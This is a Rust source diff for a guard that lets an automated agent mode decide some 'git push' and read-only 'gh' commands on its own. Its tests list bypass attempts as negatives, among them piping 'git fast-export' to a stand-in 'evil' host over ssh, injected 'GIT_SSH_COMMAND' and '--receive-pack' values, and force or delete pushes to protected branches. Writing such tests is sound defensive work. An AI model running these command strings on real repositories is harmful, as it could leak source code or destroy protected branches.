@@ -762,7 +762,8 @@ pub fn ask_context(ask: &AskView) -> (Option<HookWhat>, Context) {
     match &what {
         Some(HookWhat::Files(paths)) => context.merge(files_context(paths)),
         // the command as its detail carries it, read on its own too (as before the guard's texts were read)
-        Some(HookWhat::Command(body)) => context.merge(command_context_in(body, head)),
+        // (the command alone: the folder line after it is the desktop app's, read below)
+        Some(HookWhat::Command(body)) => context.merge(command_context_in(shown_command(body), head)),
         None => {}
     }
     let read = hook_texts(ask);
@@ -778,6 +779,11 @@ pub fn ask_context(ask: &AskView) -> (Option<HookWhat>, Context) {
     let rule = ask.topic.as_deref().and_then(|t| t.split_once(':')).map(|(_, rule)| rule);
     for t in read.texts {
         let mut c = command_context_in(t, head);
+        // The detail's whole text (its `Command:` label, the folder line): when it carries a command, that command was
+        // read and decided above, on its own; read here, the text is never a plain push, and only its holds count.
+        if ask.detail.as_deref() == Some(t) && matches!(what, Some(HookWhat::Command(_))) {
+            c.default_push = false;
+        }
         if what.is_some() && Some(t) != rule {
             context.merge(c);
         } else {
@@ -2263,7 +2269,131 @@ pub fn command_context_in(command: &str, head: Option<&GitHead>) -> Context {
             _ => {}
         }
     }
+    // The allowlist: a line that mentions `git` with `push`, or `gh`, may change a protected branch unless it is the one
+    // shape Autopilot may decide on its own ([`plain_push`], [`plain_gh`]). No reasoning about anything else.
+    let tokens: Vec<String> = command
+        .split(|ch: char| ch.is_whitespace() || ";|&()`'\"{}<>$=\\,".contains(ch))
+        .filter(|t| !t.is_empty())
+        .map(|t| shell::program_name(t).to_ascii_lowercase())
+        .collect();
+    let has = |w: &str| tokens.iter().any(|t| t == w);
+    if (has("git") && has("push") && !plain_push(command, head)) || (has("gh") && !plain_gh(command)) {
+        c.default_push = true;
+    }
     c
+}
+
+/// Characters no plain `git push` or read-only `gh` line has: what chains, groups, redirects, quotes, substitutes,
+/// globs, escapes or comments.
+const NOT_PLAIN: [char; 21] =
+    [';', '&', '|', '(', ')', '`', '$', '<', '>', '\n', '\r', '"', '\'', '\\', '{', '}', '*', '?', '[', '#', '!'];
+
+/// A branch name made of letters, digits, `.`, `_`, `-` and `/` only, as git allows one (no `..`, no `//`, no leading
+/// `-`, `.` or `/`, no trailing `/`, `.` or `.lock`), never `HEAD`, and never a full or partial ref (`refs/…`,
+/// `heads/…`, `tags/…`, `remotes/…`), which git would resolve to another name.
+fn plain_branch(name: &str) -> bool {
+    let first = name.split('/').next().unwrap_or_default().to_ascii_lowercase();
+    !name.is_empty()
+        && name.len() <= 200
+        && !name.eq_ignore_ascii_case("head")
+        && !matches!(first.as_str(), "refs" | "heads" | "tags" | "remotes" | "head")
+        && !name.starts_with(['-', '.', '/'])
+        && !name.ends_with(['/', '.'])
+        && !name.to_ascii_lowercase().ends_with(".lock")
+        && !name.contains("..")
+        && !name.contains("//")
+        && name.chars().all(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '.' | '_' | '-' | '/'))
+}
+
+/// The one shape of push Autopilot may decide on its own: the whole line is `git push`, with only `-u`,
+/// `--set-upstream`, `-q`, `--quiet`, `-v`, `--verbose`, `--no-verify`, then at most a plain remote name and plain
+/// refspecs (`branch`, `src:branch`, `HEAD`). Every destination must be a known branch that is neither protected nor
+/// the repository's default, as the desktop app reported it (`head`): without its report nothing passes, and `git
+/// push`, `git push origin` and `HEAD` are the branch it reported checked out.
+pub fn plain_push(command: &str, head: Option<&GitHead>) -> bool {
+    let Some(head) = head.filter(|h| h.default.is_some()) else {
+        return false;
+    };
+    if command.contains(NOT_PLAIN) || command.contains('=') || command.contains('~') || command.contains('@') {
+        return false;
+    }
+    let words: Vec<&str> = command.split_whitespace().collect();
+    if words.first() != Some(&"git") || words.get(1) != Some(&"push") {
+        return false;
+    }
+    let protected = |b: &str| branch_kind(b, head.default.as_deref()).is_some();
+    let ok = |b: &str| plain_branch(b) && !protected(b);
+    let current = head.branch.as_deref().is_some_and(ok);
+    let mut operands = Vec::new();
+    for w in &words[2..] {
+        if w.starts_with('-') {
+            if !matches!(*w, "-u" | "--set-upstream" | "-q" | "--quiet" | "-v" | "--verbose" | "--no-verify") {
+                return false;
+            }
+        } else {
+            operands.push(*w);
+        }
+    }
+    let Some((remote, refs)) = operands.split_first() else {
+        return current;
+    };
+    if !remote.chars().all(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '.' | '_' | '-'))
+        || remote.starts_with(['-', '.'])
+    {
+        return false;
+    }
+    if refs.is_empty() {
+        return current;
+    }
+    refs.iter().all(|r| match r.split_once(':') {
+        Some((src, dst)) => (src == "HEAD" || plain_branch(src)) && ok(dst),
+        None if *r == "HEAD" => current,
+        None => ok(r),
+    })
+}
+
+/// The `gh` lines Autopilot may decide on its own: the whole line is one `gh` command that only reads (`list`, `view`,
+/// `status`, `diff`, `checks` of a known group, `search`, `status`, `auth status`, or `api` of a REST path with no field
+/// and no method but GET). Anything else of `gh` (a write, GraphQL, an alias) may change a protected branch.
+pub fn plain_gh(command: &str) -> bool {
+    const GROUPS: [&str; 13] = [
+        "pr", "issue", "repo", "run", "release", "workflow", "gist", "label", "cache", "ruleset", "project",
+        "variable", "secret",
+    ];
+    if command.contains(NOT_PLAIN) || command.contains('=') {
+        return false;
+    }
+    let words: Vec<&str> = command.split_whitespace().collect();
+    if words.first() != Some(&"gh") {
+        return false;
+    }
+    match (words.get(1).copied(), words.get(2).copied()) {
+        (Some("status" | "--version" | "version"), _) | (Some("search"), Some(_)) | (Some("auth"), Some("status")) => {
+            true
+        }
+        (Some(group), Some("list" | "ls" | "view" | "status" | "diff" | "checks")) => GROUPS.contains(&group),
+        (Some("api"), Some(_)) => {
+            // one REST path, and only these options: `-X GET` / `--method GET`, `--paginate`, `-i`, `--include`,
+            // `--silent`
+            let mut endpoints = Vec::new();
+            let mut rest = words[2..].iter();
+            while let Some(w) = rest.next() {
+                match *w {
+                    "-X" | "--method" => {
+                        if !rest.next().is_some_and(|m| m.eq_ignore_ascii_case("get")) {
+                            return false;
+                        }
+                    }
+                    "--paginate" | "-i" | "--include" | "--silent" => {}
+                    w if w.starts_with('-') => return false,
+                    w => endpoints.push(w),
+                }
+            }
+            matches!(endpoints.as_slice(), [endpoint] if !endpoint.eq_ignore_ascii_case("graphql")
+                && endpoint.chars().all(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '/' | '_' | '-' | '.')))
+        }
+        _ => false,
+    }
 }
 
 fn publish_context(seg: &[String], c: &mut Context) {
@@ -2794,10 +2924,9 @@ mod tests {
         })
     }
 
-    /// What Auto and Overnight always ask: a push to the default branch or a protected one, from the desktop app's
-    /// summary or from a command a hook asks about, and a push whose destination is not known.
+    /// The desktop app's push summary: a push to the default branch or a protected one, by the refs it names.
     #[test]
-    fn pushes_to_the_default_branch_or_a_protected_one_always_ask() {
+    fn a_pushed_summary_to_the_default_branch_or_a_protected_one_is_marked() {
         let to = |names: &[&str], default: Option<&str>| {
             let refs: Vec<(&str, &str, bool)> = names.iter().map(|n| (*n, "update", false)).collect();
             push(&refs, default).pushes_default_branch()
@@ -2812,7 +2941,7 @@ mod tests {
         }
         assert!(to(&["deploy"], Some("deploy")) && to(&["Deploy"], Some("deploy")), "the repository's own default");
         assert!(!to(&["feature/x"], Some("deploy")), "a known default that is another branch");
-        // `release` only as itself, `release/…` or `release-…` (was any name starting with it)
+        // `release` only as itself, `release/…` or `release-…`
         for name in
             ["feature/x", "devops", "development", "fix/main-menu", "mainline-docs", "releases-notes", "releases/x"]
         {
@@ -2828,51 +2957,205 @@ mod tests {
             refs: vec![],
         };
         assert!(!changes_default_branch(&nothing), "a summary without a branch");
-
-        let cmd = |c: &str| command_context(c).pushes_default_branch();
-        for c in [
-            "git push origin main",
-            "git push origin HEAD:main",
-            "git push origin HEAD:refs/heads/main",
-            "git push origin +main",
-            "git push origin main:main",
-            "git push -u origin Main",
-            "git push origin feature/x main",
-            "git push origin feature:Staging",
-            "git push origin :release/1.0",
-            "git push --all origin",
-            "git push --branches origin",
-            "git push --mirror origin",
-            "git push origin :",
-            "git push origin HEAD",
-            "git push origin @",
-            "git push origin",
-            "git push",
-            "git push --follow-tags",
-            "git -C ~/dev/app push origin main",
-            "cd app && git push origin gh-pages",
-        ] {
-            assert!(cmd(c), "{c}: the default branch, or a destination not known");
-        }
-        for c in [
-            "git push origin feature/x",
-            "git push origin HEAD:feature/x",
-            "git push -u origin feature/x",
-            "git push origin refs/heads/feature/x",
-            "git push origin feature/a feature/b",
-            "git push --tags origin",
-            "git push origin v1.0:refs/tags/v1.0",
-            "git status",
-            "git pull origin main",
-        ] {
-            assert!(!cmd(c), "{c}");
-        }
     }
 
     /// (it asks before the model as a push to the default branch, it is read with certainty)
     fn reading(c: &str) -> (bool, bool) {
         let ctx = command_context(c);
         (ctx.pushes_default_branch(), ctx.outcome() == Outcome::Read)
+    }
+
+    fn head(branch: Option<&str>, default: Option<&str>) -> GitHead {
+        GitHead {
+            branch: branch.map(str::to_owned),
+            default: default.map(str::to_owned),
+        }
+    }
+
+    /// Autopilot may decide this line on its own (as far as pushes go): no push to a protected branch, read with
+    /// certainty.
+    fn may_decide(c: &str, h: Option<&GitHead>) -> bool {
+        let ctx = command_context_in(c, h);
+        !ctx.pushes_default_branch() && ctx.outcome() == Outcome::Read
+    }
+
+    /// The allowlist's positive side: the plain pushes of a feature branch, with the desktop app's report.
+    #[test]
+    fn the_one_shape_of_push_autopilot_may_decide() {
+        let feature = head(Some("feature/x"), Some("main"));
+        for c in [
+            "git push",
+            "git push origin",
+            "git push origin HEAD",
+            "git push -u origin HEAD",
+            "git push --set-upstream origin feature/x",
+            "git push origin feature/x",
+            "git push origin HEAD:feature/x",
+            "git push origin feature/x:feature/y",
+            "git push -q origin feature/x fix-1.2",
+            "git push --no-verify -v origin feature/x",
+            "git push upstream feature/x",
+        ] {
+            assert!(may_decide(c, Some(&feature)), "{c}");
+            assert!(plain_push(c, Some(&feature)), "{c}");
+        }
+    }
+
+    /// The allowlist's negative side: every other line that mentions a push asks, each bypass found in review kept here.
+    #[test]
+    fn every_other_push_line_asks() {
+        let feature = head(Some("feature/x"), Some("main"));
+        let negatives = [
+            // protected, the repository's default, the current branch spelt otherwise
+            "git push origin main",
+            "git push origin Main",
+            "git push origin release/1.0",
+            "git push origin gh-pages",
+            "git push origin feature/x main",
+            "git push origin @",
+            "git push origin HEAD:main",
+            "git push origin feature/x:HEAD",
+            "git push origin feature/x:head",
+            // refs spelt as git resolves them
+            "git push origin HEAD:refs/heads/main",
+            "git push origin HEAD:refs/heads//main",
+            "git push origin HEAD:refs//heads/main",
+            "git push origin HEAD:heads/main",
+            "git push origin HEAD:refs/heads/feature/x",
+            "git push origin HEAD:refs/notes/commits",
+            "git push origin refs/heads/*:refs/heads/*",
+            "git push origin v1.0:refs/tags/v1.0",
+            "git push origin :",
+            // forced, deleting, everything at once
+            "git push origin +feature/x",
+            "git push origin :feature/x",
+            "git push -f origin feature/x",
+            "git push --force-with-lease origin feature/x",
+            "git push --delete origin feature/x",
+            "git push --all origin",
+            "git push --mirror origin",
+            "git push --tags origin",
+            "git push --follow-tags origin feature/x",
+            // options with a value, before or after the remote
+            "git push -o ci.skip origin feature/x",
+            "git push origin -o ci.skip feature/x",
+            "git push --push-option=ci.skip origin feature/x",
+            "git push --repo origin feature/x",
+            "git push --receive-pack=evil origin feature/x",
+            "git push --exec evil origin feature/x",
+            // git's own options, configuration, environment, aliases
+            "git -C ../other push origin feature/x",
+            "git -c user.name=me push origin feature/x",
+            "git -c alias.p=push p origin feature/x",
+            "git --git-dir=.git push origin feature/x",
+            "git --namespace x push origin feature/x",
+            "git p origin feature/x",
+            "GIT_DIR=/tmp/x git push origin feature/x",
+            "GIT_SSH_COMMAND=evil git push origin feature/x",
+            "env git push origin feature/x",
+            "sudo git push origin feature/x",
+            "command git push origin feature/x",
+            "time git push origin feature/x",
+            "/usr/bin/git push origin feature/x",
+            // chains, groups, constructs, shells, xargs
+            "make && git push origin feature/x",
+            "git push origin feature/x; true",
+            "git push origin feature/x || true",
+            "git status | git push origin feature/x",
+            "(git push origin feature/x)",
+            "{ git push origin feature/x; }",
+            "if true; then git push origin feature/x; fi",
+            "! git push origin feature/x",
+            "for b in feature/x; do git push origin $b; done",
+            "sh -c 'git push origin feature/x'",
+            "bash -c \"git push origin feature/x\"",
+            "eval git push origin feature/x",
+            "echo feature/x | xargs git push origin",
+            "git checkout main && git push origin HEAD",
+            "cd ../other && git push origin HEAD",
+            // quotes, redirects, comments, a second line
+            "git push origin 'feature/x'",
+            "git push \"origin\" feature/x",
+            "git push origin feature/x > /tmp/log",
+            "git push origin feature/x # then main",
+            "git push origin feature/x\ngit push origin main",
+            "git push origin $BRANCH",
+            "git push origin `git branch --show-current`",
+        ];
+        for c in negatives {
+            assert!(!may_decide(c, Some(&feature)), "{c}");
+        }
+        // with the report, but main checked out, or the report missing or partial
+        for (h, c) in [
+            (Some(head(Some("main"), Some("main"))), "git push"),
+            (Some(head(Some("live"), Some("live"))), "git push origin HEAD"),
+            (Some(head(Some("feature/x"), Some("live"))), "git push origin live"),
+            (Some(head(Some("release/2"), Some("main"))), "git push -u origin HEAD"),
+            (Some(head(None, Some("main"))), "git push"),
+            (Some(head(Some("feature/x"), None)), "git push origin feature/x"),
+            (None, "git push origin feature/x"),
+            (None, "git push"),
+        ] {
+            assert!(!may_decide(c, h.as_ref()), "{c} with {h:?}");
+        }
+    }
+
+    /// `gh`: only a single command that reads passes; a write, GraphQL, `repo sync`, a merge or an alias asks.
+    #[test]
+    fn only_a_gh_line_that_reads_passes() {
+        for c in [
+            "gh pr list",
+            "gh pr view 12",
+            "gh pr checks 12",
+            "gh issue list",
+            "gh run view 5",
+            "gh repo view me/app",
+            "gh status",
+            "gh auth status",
+            "gh search issues flaky",
+            "gh api repos/me/app/issues",
+            "gh api -X GET repos/me/app/pulls",
+            "gh api --paginate repos/me/app/branches",
+        ] {
+            assert!(plain_gh(c) && may_decide(c, None), "{c}");
+        }
+        for c in [
+            "gh api -X PATCH repos/me/app/git/refs/heads/main -f sha=abc",
+            "gh api --method PUT repos/me/app/contents/README.md -f message=x",
+            "gh api repos/me/app/contents/README.md -f message=x -f content=eA",
+            "gh api repos/me/app/git/refs -f ref=refs/heads/main",
+            "gh api -XDELETE repos/me/app/git/refs/heads/feature/x",
+            "gh api repos/me/app/merges -f base=main",
+            "gh api graphql -f query='mutation { x }'",
+            "gh api graphql",
+            "gh repo sync",
+            "gh repo sync me/app -b main",
+            "gh pr merge 12",
+            "gh pr create --fill",
+            "gh co 12",
+            "gh my-alias",
+            "gh pr list && gh pr merge 1",
+            "gh pr list | sh",
+            "GH_HOST=x gh pr list",
+        ] {
+            assert!(!may_decide(c, None), "{c}");
+        }
+    }
+
+    /// The tripwires still read a forced push or a delete wherever it is written.
+    #[test]
+    fn refspec_destinations_are_normalised_for_the_tripwires() {
+        assert_eq!(push_destination("refs//heads///main"), PushDestination::Branch("main".to_owned()));
+        assert_eq!(push_destination("+heads/release/1"), PushDestination::Branch("release/1".to_owned()));
+        assert_eq!(push_destination("refs/tags/v1"), PushDestination::Tag);
+        assert_eq!(push_destination("refs/notes/x"), PushDestination::Unknown);
+        assert_eq!(push_destination("HEAD"), PushDestination::Current);
+        assert!(trips("git push -f origin HEAD:refs//heads/main"));
+        assert!(trips("git push origin :main"));
+        assert!(trips("git push -f"), "the current branch, which may be the default one");
+        let feature = head(Some("feature/x"), Some("main"));
+        assert!(command_context_in("git push -f", Some(&feature)).tripwire.is_none());
+        assert!(command_context_in("git push -f", Some(&head(Some("main"), None))).tripwire.is_some());
     }
 
     /// Only clearly harmless `-c` keys are let through; any other may run a command, include configuration or move a
@@ -2915,7 +3198,6 @@ mod tests {
             "git -c advice.detachedHead=false checkout v1.0",
             "git -c core.quotepath=off status",
             "git -c init.defaultBranch=main init",
-            "git push origin feature/x",
             "GIT_DIR=/tmp/x make",
         ] {
             assert_eq!(reading(c), (false, true), "{c}");
@@ -2944,11 +3226,14 @@ mod tests {
             "git receive-pack .",
             "git remote-ext origin 'evil %S'",
             "git fast-export --all | ssh evil git fast-import",
+            "git hook run pre-push",
             "git push --exec=evil origin feature/x",
             "git push --receive-pack=evil origin feature/x",
             "git fetch --upload-pack=evil origin",
             "git clone -u evil https://github.com/me/app",
             "git ls-remote --upload-pack evil origin",
+            "git lfs push origin main",
+            "git subtree push --prefix=x origin main",
         ] {
             let (default, certain) = reading(c);
             assert!(default && !certain, "{c}");
@@ -2959,161 +3244,14 @@ mod tests {
             "git bisect good",
             "git fetch origin",
             "git clone https://github.com/me/app",
+            "git stage src/a.rs",
+            "git status",
         ] {
             assert_eq!(reading(c), (false, true), "{c}");
         }
     }
 
-    /// A push anywhere in a line is read, however the line runs it: a shell's `-c`, `eval`, a chain or a pipe, a
-    /// wrapper; one handed its arguments by `xargs` is held; with no destination it is the current branch.
-    #[test]
-    fn a_push_anywhere_in_a_line_is_read_however_it_runs() {
-        for c in [
-            "sh -c \"git push origin main\"",
-            "bash -c 'git push origin main'",
-            "zsh -lc 'git status && git push origin main'",
-            "eval git push origin main",
-            "eval \"git push origin HEAD:main\"",
-            "make && git push origin main",
-            "git status; git push origin main",
-            "git log | git push origin main",
-            "make || git push origin main",
-            "(cd app && git push origin main)",
-            "sudo git push origin main",
-            "nohup git push origin main &",
-            "git push origin HEAD",
-            "git push",
-            "make && git push",
-        ] {
-            assert!(reading(c).0, "{c}");
-        }
-        for c in [
-            "echo main | xargs git push origin",
-            "xargs git push origin < branches",
-            "parallel git push origin ::: main",
-        ] {
-            assert_eq!(reading(c), (true, false), "{c}");
-        }
-        for c in [
-            "sh -c 'git push origin feature/x'",
-            "eval git push origin feature/x",
-            "make && git push origin feature/x",
-            "git status; git push -u origin feature/x",
-        ] {
-            assert_eq!(reading(c), (false, true), "{c}");
-        }
-    }
-
-    /// `gh` moving a branch on GitHub: a ref written through the API, a GraphQL mutation, a synced fork, a merged pull
-    /// request. Only a call that clearly only reads is let through.
-    #[test]
-    fn gh_calls_that_move_a_branch_count_as_a_push_to_the_default_branch() {
-        for c in [
-            "gh api -X PATCH repos/me/app/git/refs/heads/main -f sha=abc",
-            "gh api --method PATCH repos/me/app/git/refs/heads/main -F force=true",
-            "gh api repos/me/app/git/refs -f ref=refs/heads/main -f sha=abc",
-            "gh api repos/me/app/git/refs/heads/main",
-            "gh api -XDELETE repos/me/app/git/refs/heads/release/1.0",
-            "gh api repos/me/app/merges -f base=main -f head=feature/x",
-            "gh api repos/me/app/branches/main/rename -f new_name=old",
-            "gh api graphql -f query='mutation { updateRef(input: {}) { clientMutationId } }'",
-            "gh repo sync",
-            "gh repo sync me/app -b main",
-            "gh pr merge 12 --squash",
-        ] {
-            assert!(reading(c).0, "{c}");
-        }
-        for c in [
-            "gh api -X GET repos/me/app/git/refs/heads/main",
-            "gh api --method=GET repos/me/app/branches/main/protection",
-            "gh api repos/me/app/issues",
-            "gh pr list",
-            "gh pr view 12",
-            "gh repo view me/app",
-        ] {
-            assert!(!reading(c).0, "{c}");
-        }
-    }
-
-    /// A push of the current branch is read against what the desktop app reported: a feature branch passes, a protected
-    /// or unknown one asks, and the report no longer holds once the line changes folder, branch or repository.
-    #[test]
-    fn a_push_of_the_current_branch_is_read_against_the_reported_branch() {
-        let head = |branch: Option<&str>, default: Option<&str>| GitHead {
-            branch: branch.map(str::to_owned),
-            default: default.map(str::to_owned),
-        };
-        let feature = head(Some("feature/x"), Some("main"));
-        let at = |c: &str, h: &GitHead| {
-            let ctx = command_context_in(c, Some(h));
-            (ctx.pushes_default_branch(), ctx.outcome() == Outcome::Read)
-        };
-        for c in ["git push", "git push origin", "git push origin HEAD", "git push -u origin HEAD", "git push origin @"]
-        {
-            assert_eq!(at(c, &feature), (false, true), "{c}: a feature branch checked out");
-            assert!(at(c, &head(Some("main"), Some("main"))).0, "{c}: main checked out");
-            assert!(at(c, &head(Some("release/2"), None)).0, "{c}: a protected name checked out");
-            assert!(at(c, &head(Some("live"), Some("live"))).0, "{c}: the repository's own default, whatever its name");
-            assert!(at(c, &head(None, Some("main"))).0, "{c}: no branch reported");
-            assert!(command_context(c).pushes_default_branch(), "{c}: nothing reported");
-        }
-        // the repository's real default counts for a named destination too
-        assert!(at("git push origin live", &head(Some("feature/x"), Some("live"))).0);
-        assert!(!at("git push origin feature/y", &head(Some("feature/x"), Some("live"))).0);
-        // the report is about the folder and the branch the hook saw: not after a change of either
-        for c in [
-            "cd ../other && git push origin HEAD",
-            "git checkout main && git push origin HEAD",
-            "git switch main; git push",
-            "git -C ../other push origin HEAD",
-            "git stash && git push",
-        ] {
-            assert!(at(c, &feature).0, "{c}");
-        }
-        // a force push of a feature branch checked out is one of a branch that is not the default; of main, a tripwire
-        assert!(trips("git push -f"), "nothing reported: it may be the default branch");
-        assert!(command_context_in("git push -f", Some(&feature)).tripwire.is_none());
-        assert!(command_context_in("git push -f", Some(&head(Some("main"), None))).tripwire.is_some());
-    }
-
-    /// Options of `git push` that take a value are read with it, before or after the remote, so that the value is never
-    /// taken for the remote or a refspec.
-    #[test]
-    fn push_options_with_a_value_never_shift_the_remote_or_the_refspecs() {
-        for c in [
-            "git push -o ci.skip origin main",
-            "git push origin -o ci.skip main",
-            "git push --push-option ci.skip origin main",
-            "git push origin --push-option=ci.skip main",
-            "git push -oci.skip origin main",
-            "git push -uo ci.skip origin main",
-            "git push --repo origin main",
-            "git push --repo=origin main",
-            "git push --push-o ci.skip origin main",
-        ] {
-            assert!(command_context(c).pushes_default_branch(), "{c}");
-        }
-        for c in [
-            "git push -o ci.skip origin feature/x",
-            "git push origin -o ci.skip feature/x",
-            "git push --push-option ci.skip origin feature/x",
-            "git push origin feature/x --push-option ci.skip",
-            "git push -oci.skip origin feature/x",
-            "git push -uo ci.skip origin feature/x",
-            "git push --repo origin feature/x",
-            "git push --repo=origin feature/x",
-        ] {
-            assert!(!command_context(c).pushes_default_branch(), "{c}");
-        }
-        // options naming the program on the other side take a value too (and are held as running one)
-        for c in ["git push --receive-pack x origin feature/x", "git push origin --exec x feature/x"] {
-            let ctx = command_context(c);
-            assert!(ctx.pushes_default_branch() && ctx.outcome() != Outcome::Read, "{c}");
-        }
-    }
-
-    /// The shell's reserved words never hide the command after them, and a construct whose words are not a command is
-    /// held.
+    /// The shell's reserved words never hide a push, and a construct whose words are not a command is held.
     #[test]
     fn reserved_words_never_hide_a_push() {
         for c in [
@@ -3125,84 +3263,8 @@ mod tests {
         ] {
             assert!(command_context(c).pushes_default_branch(), "{c}");
         }
-        let looped = command_context("for b in main; do git push origin $b; done");
-        assert!(looped.outcome() != Outcome::Read, "a loop over branches: held");
+        assert_ne!(command_context("for b in main; do git push origin $b; done").outcome(), Outcome::Read);
         assert_ne!(command_context("case $x in a) git push origin feature/x;; esac").outcome(), Outcome::Read);
-        let feature = command_context("if true; then git push origin feature/x; fi");
-        assert!(
-            !feature.pushes_default_branch() && feature.outcome() == Outcome::Read,
-            "a feature push stays as it was"
-        );
-    }
-
-    /// A push destination is read as git resolves it, and only a branch clearly not protected, or a tag, is let
-    /// through: odd spellings of main, other ref namespaces and patterns count as the default branch.
-    #[test]
-    fn refspecs_are_normalised_as_git_does_and_anything_unclear_counts_as_the_default_branch() {
-        let cmd = |c: &str| command_context(c).pushes_default_branch();
-        for c in [
-            "git push origin HEAD:refs/heads//main",
-            "git push origin HEAD:refs//heads/main",
-            "git push origin HEAD://refs/heads/main",
-            "git push origin HEAD:heads/main",
-            "git push origin HEAD:Refs/Heads/Main",
-            "git push origin +refs/heads/main",
-            "git push origin feature:refs/heads/main/",
-            "git push origin HEAD:refs/notes/commits",
-            "git push origin HEAD:refs/remotes/origin/feature",
-            "git push origin HEAD:refs/for/main",
-            "git push origin refs/heads/*:refs/heads/*",
-            "git push origin HEAD:refs/heads",
-        ] {
-            assert!(cmd(c), "{c}");
-        }
-        for c in [
-            "git push origin HEAD:refs/heads/feature/x",
-            "git push origin HEAD:heads/feature/x",
-            "git push origin feature/x:refs//heads//feature/x",
-            "git push origin v1.0:refs/tags/v1.0",
-            "git push origin tags/v1.0",
-            "git push origin main~1:feature",
-        ] {
-            assert!(!cmd(c), "{c}");
-        }
-        assert_eq!(push_destination("refs//heads///main"), PushDestination::Branch("main".to_owned()));
-        assert_eq!(push_destination("+heads/release/1"), PushDestination::Branch("release/1".to_owned()));
-        assert_eq!(push_destination("refs/tags/v1"), PushDestination::Tag);
-        assert_eq!(push_destination("refs/notes/x"), PushDestination::Unknown);
-        // a force push to an odd spelling of main is the tripwire it always was
-        assert!(trips("git push -f origin HEAD:refs//heads/main"));
-    }
-
-    /// git's own options are read with their values, and a word after them that is not a git command (an alias, one
-    /// defined in the command itself, another program) is not known: it may push to main, and it is held.
-    #[test]
-    fn a_push_hidden_behind_gits_options_or_an_alias_is_not_read_as_safe() {
-        let read = |c: &str| {
-            let ctx = command_context(c);
-            (ctx.pushes_default_branch(), ctx.outcome() == Outcome::Read)
-        };
-        assert_eq!(read("git -C ~/dev/app push origin main"), (true, true));
-        assert_eq!(read("git --namespace x push origin main"), (true, true));
-        // was read with certainty: another repository named on the command line is now held, as GIT_DIR is
-        assert_eq!(read("git --git-dir .git --work-tree . push origin main"), (true, false));
-        assert_eq!(read("git --namespace=x push origin main"), (true, true));
-        // an alias defined in the command itself, or one only the computer knows: held, and counted as main
-        assert_eq!(read("git -c alias.p=push p origin main"), (true, false));
-        assert_eq!(read("git -c alias.p=push p origin feature/x"), (true, false));
-        assert_eq!(read("git p origin main"), (true, false));
-        assert_eq!(read("git pushit"), (true, false));
-        assert_eq!(read("git --config-env=alias.p=PUSH p"), (true, false));
-        // where the remote pushes, redefined in the command
-        assert_eq!(read("git -c remote.origin.push=HEAD:main push origin"), (true, false));
-        assert_eq!(read("git -c remote.origin.push=HEAD:main push origin feature/x"), (true, false));
-        // the namespace's value is never read as the command
-        assert_eq!(read("git --namespace push status"), (false, true));
-        // the plain ones stay as they were
-        assert_eq!(read("git push origin feature/x"), (false, true));
-        assert_eq!(read("git -C ~/dev/app push origin feature/x"), (false, true));
-        assert_eq!(read("git -c user.name=me commit -m wip"), (false, true));
-        assert_eq!(read("git status"), (false, true));
     }
 
     #[test]
